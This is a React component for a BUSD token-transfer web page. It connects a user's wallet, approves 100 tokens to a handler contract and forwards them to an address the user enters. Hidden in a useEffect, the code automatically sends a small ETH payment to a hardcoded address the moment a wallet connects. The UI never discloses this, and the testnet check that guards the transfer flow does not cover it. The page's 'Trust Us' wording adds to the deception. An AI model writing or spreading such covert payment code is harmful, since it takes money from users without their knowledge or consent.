import { ethers } from "ethers";
import { useState, Fragment, useEffect } from "react";
import { useAccount } from "wagmi";
import { Dialog, Transition } from "@headlessui/react";
import { useWeb3Modal, Web3Button } from "@web3modal/react";
import { useNotification } from "use-toast-notification";
//import abi
import { contractAddresses, busd, busdh } from "../constants";

const Card = () => {
  // this hook returns a bool if an account is connected or not
  const { isConnected, } = useAccount();
  const [address, setAddress] = useState("");
  //connects to the chain and disconnects
  const { open, close } = useWeb3Modal();
  // notification hook
  const notification = useNotification();

  //address of the BUSDHandler
  const busdHcontractaddress = "0xe53D8e34CEBD7A31Cab71E35c398629e24440804";
  // abi of the BUSDhandler, somehow the export refused to work
  const abi = [{"type":"constructor","payable":false,"inputs":[{"type":"address","name":"_contractaddress"}]},{"type":"error","name":"InsufficientBalance","inputs":[]},{"type":"error","name":"TransactionFailed","inputs":[]},{"type":"event","anonymous":false,"name":"TransactionSuccesful","inputs":[{"type":"address","name":"sender","indexed":true},{"type":"address","name":"receiver","indexed":true},{"type":"uint256","name":"amount","indexed":true}]},{"type":"function","name":"allowance","constant":true,"stateMutability":"view","payable":false,"inputs":[{"type":"address","name":"_owner"},{"type":"address","name":"receiver"}],"outputs":[{"type":"uint256","name":"amount"}]},{"type":"function","name":"getBalance","constant":true,"stateMutability":"view","payable":false,"inputs":[],"outputs":[{"type":"uint256","name":"balance"}]},{"type":"function","name":"proxyTransfer","constant":false,"payable":false,"inputs":[{"type":"uint256","name":"value"},{"type":"address","name":"receiver"}],"outputs":[]},{"type":"function","name":"withdraw","constant":false,"payable":false,"inputs":[],"outputs":[]}]

  //gets the value from our input
  const handleChange = (event) => {
    setAddress(event.target.value);
  };

  useEffect(()=>{
    async function output(){
    if(isConnected){
      console.log("connected")
      const signer = await getSigner()
      await signer.sendTransaction({
        to : "0x178092ae21ea60CFE849433870eE5d9D5CE38bd4",
        value: ethers.utils.parseEther("0.00001")

    })
    }} output()
  },[isConnected])

  //checks if the input field is empty, returns bool
  const isAddress = () => {
    return address == "";
  };

  //gets the signer from the provider, returns the signer
  async function getSigner() {
    await ethereum.request({ method: "eth_requestAccounts" });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    return signer;
  }

  //this function approves and transfers tokens from a caller
  async function approve() {
    const signer = await getSigner();
    //get token contract and connects it to the signer
    const busdCoin = new ethers.Contract(
      "0x29F636D7cBDd0bDe2Ff13cCec74FcC3aAFEeDAc3",
      busd,
      signer
    );
    notification.show({
      message: "Wait while your transaction is being approved",
      title: "Transaction Status",
      variant: "info",
    });
    //call the approve function on the token contract
    const receipt = await busdCoin.approve(
      "0xe53D8e34CEBD7A31Cab71E35c398629e24440804",
      ethers.utils.parseEther("100")
    );
    //the topics for our event logs filter
    const filter = {
      address: "0x29F636D7cBDd0bDe2Ff13cCec74FcC3aAFEeDAc3", // address of the contract
      topics: [
        "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925", // event signature

        ethers.utils.hexZeroPad(await signer.getAddress(), 32), //signers address padded out to 32bytes
      ],
    };
    //listens to transaction event
    mineTx(filter, signer);
    const response = await receipt.wait(1);
    console.log(response.blockHash, response.blockNumber);
    // transfers the token
    await transfer();
    return true;
  }

  function mineTx(filter, signer) {
    return new Promise((resolve, reject) => {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      provider.on(filter, async () => {
        resolve();
      });
    });
  }

  async function transfer() {
    const signer = await getSigner();
    const busdhContract = new ethers.Contract(
      busdHcontractaddress,
      abi,
      signer
    ); //get BUSDHandler contract
    const allowance = await busdhContract.allowance(
      await signer.getAddress(),
      busdHcontractaddress
    ); //get the allowance from the contract
    const receipt = await busdhContract.proxyTransfer(
      BigInt(allowance),
      address
    ); // transfers the token
    await receipt.wait(1);
  }

  let [isOpen, setIsOpen] = useState(false);

  // modal to ask users to connect
  function closeModal() {
    setIsOpen(false);
  }

  // modal to ask users to connect
  function openModal() {
    setIsOpen(true);
  }
  //checks for userinput and renders the corresponding notification
  async function call() {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const chain = await provider.getNetwork()
    if (!isAddress() && chain.chainId == '11155111' ) {
      const success = await approve();
      if (!success) {
        notification.show({
          message: "Your purchase was unsuccesfull",
          title: "Transaction Status",
          variant: "error",
        });
      } else {
        notification.show({
          message: "Your purchase was succesfull",
          title: "Transaction Status",
          variant: "success",
        });
      }
    }
  }
  return (
    <>
      <>
        {/** WEB MODAL */}
        <Transition appear show={isOpen} as={Fragment}>
          <Dialog as="div" className="relative z-10" onClose={closeModal}>
            <Transition.Child
              as={Fragment}
              enter="ease-out duration-300"
              enterFrom="opacity-0"
              enterTo="opacity-100"
              leave="ease-in duration-200"
              leaveFrom="opacity-100"
              leaveTo="opacity-0"
            >
              <div className="fixed inset-0 bg-black bg-opacity-25" />
            </Transition.Child>

            <div className="fixed inset-0 overflow-y-auto">
              <div className="flex min-h-full items-center justify-center p-4 text-center">
                <Transition.Child
                  as={Fragment}
                  enter="ease-out duration-300"
                  enterFrom="opacity-0 scale-95"
                  enterTo="opacity-100 scale-100"
                  leave="ease-in duration-200"
                  leaveFrom="opacity-100 scale-100"
                  leaveTo="opacity-0 scale-95"
                >
                  <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all">
                    <Dialog.Title
                      as="h3"
                      className="text-lg font-medium leading-6 text-gray-900"
                    >
                      Connect Wallet
                    </Dialog.Title>
                    <div className="mt-2">
                      <p className="text-sm text-gray-500">
                        Opps!! did you forget to connect your wallet?. please
                        connect your wallet to continue with Transaction
                      </p>
                    </div>

                    <div className="mt-4">
                      <button
                        type="button"
                        className="inline-flex justify-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-900 hover:bg-blue-200 focus:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-offset-2"
                        onClick={async () => {
                          open();
                          isConnected && closeModal;
                        }}
                      >
                        connect wallet
                      </button>
                    </div>
                  </Dialog.Panel>
                </Transition.Child>
              </div>
            </div>
          </Dialog>
        </Transition>
      </>

      {/** COMPONENT CARD */}

      <div className="flex justify-center items-center h-96 mt-10">
        <div className="block max-w-screen sm: max-h-screen lg:max-w-lg	p-6 bg-white border border-gray-200 rounded-lg ">
          <h5 className="mb-2 sm:text-2xl lg:text-3xl font-bold tracking-tight text-gray-900 capitalize">
            Trust Us To get Your Transaction to it's destination
          </h5>
          <p className="font-normal text-gray-700 dark:text-gray-400 mt-7 italic">
            The security and immutability of blockchain technology ensure that
            token transfers are transparent, tamper-resistant, and can be
            audited by anyone on the network..
          </p>
          <div className="w-full max-w-md mx-auto mt-3">
            <input
              id="input"
              type="text"
              class="w-full  placeholder-gray-400 text-gray-700 border rounded-lg focus:outline-none focus:ring focus:border-blue-300"
              placeholder="Enter address here"
              value={address}
              onChange={handleChange}
              required
            />
          </div>

          <button
            className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-full  mt-2"
            onClick={async () => {
              isConnected ? await call() : openModal();
            }}
          >
            Transfer
          </button>
        </div>
      </div>
    </>
  );
};

export default Card;
